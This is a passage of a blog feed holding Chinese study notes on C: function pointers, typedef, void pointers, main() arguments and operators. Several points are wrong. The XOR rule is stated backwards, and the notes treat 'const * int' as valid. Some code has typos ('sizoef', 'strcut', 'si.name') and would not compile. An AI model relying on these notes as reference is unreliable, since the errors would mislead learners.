</p><blockquote></blockquote></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>函数指针合集</title>
    <link href="/2023/04/20/C/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E5%90%88%E9%9B%86/"/>
    <url>/2023/04/20/C/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E5%90%88%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>学习目标：</p><ol><li>认识函数指针</li><li>typedef和函数指针</li><li>万能指针充当函数指针</li></ol><p>[TOC]</p><h1 id="函数指针合集"><a href="#函数指针合集" class="headerlink" title="函数指针合集"></a>函数指针合集</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol><li><p>什么是函数指针</p><blockquote><p>对应函数在内存当中的首地址</p></blockquote></li><li><p>定义函数指针 </p><ul><li><p>使用(*标识符（可以当作指针变量的名字）)替换函数名，剩下的照抄</p></li><li><p>使用示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    ;<br>&#125;<br><span class="hljs-type">int</span> (*p_func)(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)<span class="hljs-comment">//函数指针</span><br><span class="hljs-type">void</span> (*p)(<span class="hljs-type">int</span> ,<span class="hljs-type">int</span> )=<span class="hljs-literal">NULL</span>;<span class="hljs-comment">//形参可以不写</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>通过函数指针调用</p><ul><li><p>给函数指针赋值（通常使用函数名）</p><ul><li><p>直接用函数指针替换函数名调用</p></li><li><p>指针的<code>*</code>操作，调用</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d,%d\n&quot;</span>,a,b);<br>&#125;<br><span class="hljs-type">void</span> *<span class="hljs-title function_">p_func2</span> <span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;void (*p_func2) (int a,int b)\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">//在main里面的定义的函数指针</span><br>    <span class="hljs-type">void</span> (*p)(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">void</span> *pp=p_func2();<br>    p=func1;<br>    func1(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);<br>    <span class="hljs-comment">//在外面定义的函数指针</span><br>    *p_func2();<br>    *pp;<br>    system(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul></li><li><p>函数指针有什么用？、</p><blockquote><p>充当回调函数（以函数指针为参数的函数）</p></blockquote><p>实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Max</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a&gt;b?a:b;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">Min</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(a&gt;b)<br>        <span class="hljs-keyword">return</span> b;<br>    <span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Printf_S</span><span class="hljs-params">(<span class="hljs-type">int</span> (*p)(<span class="hljs-type">int</span> ,<span class="hljs-type">int</span>),<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,p(a,b));<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> (*pp)(<span class="hljs-type">int</span> (<span class="hljs-type">int</span> ,<span class="hljs-type">int</span>),<span class="hljs-type">int</span> ,<span class="hljs-type">int</span> )=Printf_S;<br>    pp(Min,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br>    pp(Max,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    func();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="C:\Users\12414\Desktop\学\笔记\c\函数指针\函数指针合集.assets\image-20221227220007304.png" alt="image-20221227220007304"></p></li></ol><h2 id="typedef和函数指针"><a href="#typedef和函数指针" class="headerlink" title="typedef和函数指针"></a><code>typedef和函数指针</code></h2><ol><li><p><code>typedef</code>基本用法，给类型起别名   </p></li><li><p>定义函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Max</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a&gt;b?a:b;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">Min</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(a&gt;b)<br>        <span class="hljs-keyword">return</span> b;<br>    <span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Printf_S</span><span class="hljs-params">(<span class="hljs-type">int</span> (*p)(<span class="hljs-type">int</span> ,<span class="hljs-type">int</span>),<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,p(a,b));<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> (*pp)(<span class="hljs-type">int</span> (*)(<span class="hljs-type">int</span> ,<span class="hljs-type">int</span>),<span class="hljs-type">int</span> ,<span class="hljs-type">int</span> )=Printf_S;<br>    <span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*ppp)</span><span class="hljs-params">(<span class="hljs-type">int</span> (*)(<span class="hljs-type">int</span> ,<span class="hljs-type">int</span>),<span class="hljs-type">int</span> ,<span class="hljs-type">int</span> )</span>;<br>    ppp p_f=Printf_S;<br>    p_f(Max,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>);<br>    pp(Min,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="万能指针充当函数指针"><a href="#万能指针充当函数指针" class="headerlink" title="万能指针充当函数指针"></a>万能指针充当函数指针</h2><ol><li><p>万能指针：空类型的指针(<code>void *p</code>)</p></li><li><p>万能指针可以操作任何类型的指针，但是在使用前必须强制类型转换</p><ul><li>语法：（要转换的类型）</li></ul></li><li><p>万能指针操作数据类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">244</span>;<br>    <span class="hljs-type">float</span> b=<span class="hljs-number">3.14f</span>;<br>    <span class="hljs-type">void</span> *p=<span class="hljs-literal">NULL</span>;<br>    p=&amp;a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,*(<span class="hljs-type">int</span> *)p);<br>    p=&amp;b;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%f\n&quot;</span>,*(<span class="hljs-type">float</span> *)p);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>函数指针的类型(去掉变量名)</p><p>例如：<code>void (*p)(int,int);</code>类型为<code>void (*)(int,int)</code></p><p>调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">244</span>;<br>    <span class="hljs-type">float</span> b=<span class="hljs-number">3.14f</span>;<br>    <span class="hljs-type">void</span> *p=<span class="hljs-literal">NULL</span>;<br>    p=&amp;a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,*(<span class="hljs-type">int</span> *)p);<br>    p=&amp;b;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%f\n&quot;</span>,*(<span class="hljs-type">float</span> *)p);<br>    p=print;<br>    ((<span class="hljs-type">void</span>(*)())p)();<br>    (*(<span class="hljs-type">void</span>(*)())p)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ol><li>区分下面4中代码</li></ol>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">int</span> * p=&amp;a;<br><span class="hljs-type">const</span> * <span class="hljs-type">int</span> p=&amp;a;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> * <span class="hljs-type">const</span> p=&amp;a;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> <span class="hljs-type">const</span> * p=&amp;a;<br></code></pre></td></tr></table></figure><ul><li><p><code>*</code>前面的<code>const</code>写在前面和后面是一样的</p><p> 例如：<code>const *int x=1;</code> <code>int const* x=1;</code> 都是让指向的值变成常量</p><p>作用是修饰数据类型的，也就是指向指针所指向的类型</p></li><li><p><code>int* const p</code>  是指针变成了常量，指针只能指一个地址</p></li></ul><ol start="2"><li><p>区分指针数组，数组指针（哪个在后面就是什么）</p><ul><li><p>指针数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* p[<span class="hljs-number">3</span>]=&#123;<span class="hljs-string">&quot;chg&quot;</span>,<span class="hljs-string">&quot;zjy&quot;</span>,<span class="hljs-string">&quot;tsy&quot;</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; ++i) &#123;<br>        <span class="hljs-built_in">puts</span>(p[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>main函数传参</title>
    <link href="/2023/04/20/C/main%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82/"/>
    <url>/2023/04/20/C/main%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="main函数传参"><a href="#main函数传参" class="headerlink" title="main函数传参"></a>main函数传参</h1><h2 id="三个问题"><a href="#三个问题" class="headerlink" title="三个问题"></a>三个问题</h2><ol><li>参数个数</li><li>首个参数到底是谁</li><li>带空格的参数</li></ol><h2 id="基本形式"><a href="#基本形式" class="headerlink" title="基本形式"></a>基本形式</h2><ol><li><pre><code class="c">int main(int argc,char* argv[])&#123;    return 0;&#125;<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-number">2.</span> 第一个参数的意思是：参数的个数<br><br><span class="hljs-number">3.</span> 第二个参数的意思是：存放的参数，而且至少有一个，如果打印的话，结果是该项目的名称<br><br>   实例：<br><br>   ```<span class="hljs-function">c</span><br><span class="hljs-function">   <span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span></span><br><span class="hljs-function">   </span>&#123;<br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; argc; i++)<br>   &#123;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, argv[i]);<br>   &#125;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>   &#125;<br></code></pre></td></tr></table></figure>运行结果：![image-20221225201855246](C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20221225201855246.png)</code></pre></li><li></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作符详解</title>
    <link href="/2023/04/20/C/%E6%93%8D%E4%BD%9C%E7%AC%A6%E8%AF%A6%E8%A7%A31/"/>
    <url>/2023/04/20/C/%E6%93%8D%E4%BD%9C%E7%AC%A6%E8%AF%A6%E8%A7%A31/</url>
    
    <content type="html"><![CDATA[<h1 id="操作符详解"><a href="#操作符详解" class="headerlink" title="操作符详解"></a>操作符详解</h1><h2 id="算术操作符"><a href="#算术操作符" class="headerlink" title="算术操作符"></a>算术操作符</h2><ol><li>+,-,*,&#x2F;</li><li>除法（-）:得到商，如果结果是小数，int类型只会打印整形，解决方法：<ul><li>将商类型转化</li><li>直接将变量定义为double</li></ul></li><li>余数（%）：只用于整数</li></ol><h2 id="移位操作符"><a href="#移位操作符" class="headerlink" title="移位操作符"></a>移位操作符</h2><ol><li>&gt;&gt;和&lt;&lt;左移操作符</li><li>右移两种移法<ul><li>算术右移：右边丢弃一位（存储的二进制），然后左边增加符号位(当前主要)</li><li>逻辑右移：右边丢弃，左边补0</li></ul></li><li>例子：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a =<span class="hljs-number">16</span>;<br><span class="hljs-type">int</span> b=a&gt;&gt;<span class="hljs-number">1</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,b);<br><span class="hljs-comment">//结果是8（2^3）</span><br><span class="hljs-comment">//因为16的二进制是（32位）</span><br><span class="hljs-comment">//0（27位）10（4位）</span><br><span class="hljs-comment">//丢弃一位10（27位）10（3位）</span><br><span class="hljs-comment">//右移一位有除2二的效果</span><br></code></pre></td></tr></table></figure></li><li>补充知识：<ul><li>原码，反码，补码</li><li>整数的3码相同。负数的反码为：符号位不变，其他位按位取反。补码：负数的存储格式，为反码加1</li></ul></li><li>左移：左边丢弃，右边补零</li></ol><h2 id="位操作符"><a href="#位操作符" class="headerlink" title="位操作符"></a>位操作符</h2><ol><li>&amp;（按位与），|按位与，</li><li>&amp;只要有0，则为0，两个1，才为<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a=<span class="hljs-number">3</span>;<br><span class="hljs-type">int</span> b=<span class="hljs-number">5</span>;<br><span class="hljs-type">int</span> c=a&amp;b;<br><span class="hljs-comment">//a在计算机中为00000000000000000000000000000011</span><br><span class="hljs-comment">//b在计算机中为00000000000000000000000000000101</span><br><span class="hljs-comment">//按位与：     00000000000000000000000000000001</span><br><span class="hljs-comment">//切记是补码进行按位与</span><br></code></pre></td></tr></table></figure></li><li>| 按位或：补码，有1则为1</li><li>^按位异或：2进制补码，相同为1，相异为0</li><li>实现两数的交换<ul><li>倒水法（创建临时变量）</li><li>加减法（值大了，容易溢出）</li><li>^法（除了代码难读，没有缺点）</li></ul></li></ol><h2 id="赋值操作符"><a href="#赋值操作符" class="headerlink" title="赋值操作符"></a>赋值操作符</h2><ol><li>连续赋值<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">x=y=z=<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure></li><li>判断为&#x3D;&#x3D;</li><li>复合操作符：<ul><li>+&#x3D;，-&#x3D;等等</li></ul></li></ol><h2 id="单目操作符"><a href="#单目操作符" class="headerlink" title="单目操作符"></a>单目操作符</h2><ol><li>！：把假变成真，把真变成假  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//a为真打印</span><br><span class="hljs-keyword">if</span>(a)<br>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,a);<br>&#125;<br><span class="hljs-comment">//a为假打印</span><br><span class="hljs-keyword">if</span>(!a)<br>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,a);<br>&#125;<br></code></pre></td></tr></table></figure></li><li>&amp;(取地址):配合指针<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span>* p=&amp;a;<br>*p=<span class="hljs-number">20</span>;<span class="hljs-comment">//让a等于20</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li>sizoef:计算所占空间的大小，单位是字节，注意区分，strlen(数组的长度，不包括‘\0’);<ul><li>指针大小，要不是4（32位系统）个字节，要不是8（64位字节）个字节</li><li>内部表的式不参加运算<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">short</span> s=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,<span class="hljs-built_in">sizoef</span>(s=a+<span class="hljs-number">5</span>));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,s);<br><span class="hljs-comment">//结果为2和0，因为不参与运算</span><br></code></pre></td></tr></table></figure></li></ul></li><li>~（按位(二进制)取反）：将二进制按位取反，所有位按位取反</li><li>++a:先++，后使用</li><li>a++:先使用，再++<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,a++);<br><span class="hljs-comment">//结果位0；</span><br></code></pre></td></tr></table></figure></li><li>(类型)：强制类型转换</li></ol><h2 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h2><ol><li>&amp;&amp;（逻辑与）并且；<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> a=<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> b=<span class="hljs-number">20</span>;<br><span class="hljs-type">int</span> c=a&amp;&amp;b;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,c);<br><span class="hljs-comment">//结果为1，因为a,b都为真</span><br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,a=<span class="hljs-number">0</span>,b=<span class="hljs-number">2</span>,c=<span class="hljs-number">3</span>,d=<span class="hljs-number">4</span>;<br>i=a++ &amp;&amp; ++b &amp;&amp; d++;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d,%d,%d,%d&quot;</span>,a,b,c,d);<br><span class="hljs-comment">//结果为i=0,a=1,b=2,c=3,d=4;</span><br><span class="hljs-comment">//因为先使用a,a=0,为假，后面不计算</span><br></code></pre></td></tr></table></figure></li><li>&amp;&amp;,||：对于&amp;&amp;来说只要前面是假，后面不算，对于||来说只要前面是真，就不算</li></ol><h2 id="条件操作符"><a href="#条件操作符" class="headerlink" title="条件操作符"></a>条件操作符</h2><ol><li><p>exp1?exp2:exp3:如果表达式一位真，则表达式二计算，且为整个表达式的结果，反之是表达式3</p></li><li><p>，（逗号表达式）：简便代码</p></li></ol><h2 id="下标引用操作符"><a href="#下标引用操作符" class="headerlink" title="下标引用操作符"></a>下标引用操作符</h2><ol><li>[]:常用于数组</li></ol><h2 id="函数调用操作符"><a href="#函数调用操作符" class="headerlink" title="函数调用操作符"></a>函数调用操作符</h2><ol><li>()：用于函数</li></ol><h2 id="访问一个结构的成员"><a href="#访问一个结构的成员" class="headerlink" title="访问一个结构的成员"></a>访问一个结构的成员</h2><ol><li><p>struct: 创建一个结构体</p></li><li><p>.成员名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-comment">//相当于盖房子时的规划图,name,age,id为成员</span><br>strcut stu<br>&#123;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">10</span>];<br>    <span class="hljs-type">int</span> age;<br>    <span class="hljs-type">char</span> id[<span class="hljs-number">20</span>]<br>&#125;;<span class="hljs-comment">//注意分号</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    strcut stu s1=&#123;<span class="hljs-string">&quot;chg&quot;</span>,<span class="hljs-number">20</span>,<span class="hljs-string">&quot;2022124032&quot;</span>&#125;;<span class="hljs-comment">//往规划图里面加东西</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span>* <span class="hljs-title">ps</span>=</span>&amp;s1;<span class="hljs-comment">//得到s1的地址</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,si.name);<span class="hljs-comment">//1</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,s1.age);<span class="hljs-comment">//2.查找成员</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,si.id);<span class="hljs-comment">//3</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,(*ps).name);<span class="hljs-comment">//与1相同</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,ps-&gt;name);<span class="hljs-comment">//与1相同</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="表达式的求和顺序"><a href="#表达式的求和顺序" class="headerlink" title="表达式的求和顺序"></a>表达式的求和顺序</h2><p>由操作的优先级和结合性决定</p><ol><li><p>隐式类型转换：</p><ul><li><p>整型提升：C的整型算术运算总是至少以缺省整型类型的精度来进行的。 为了获得这个精度，表达式中的字符和短整型操作数在使用之前被转换为普通整型，这种转换称为整型；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> a=<span class="hljs-number">3</span>;<br>    <span class="hljs-comment">//char 占1个字节，一共8个字符</span><br>    <span 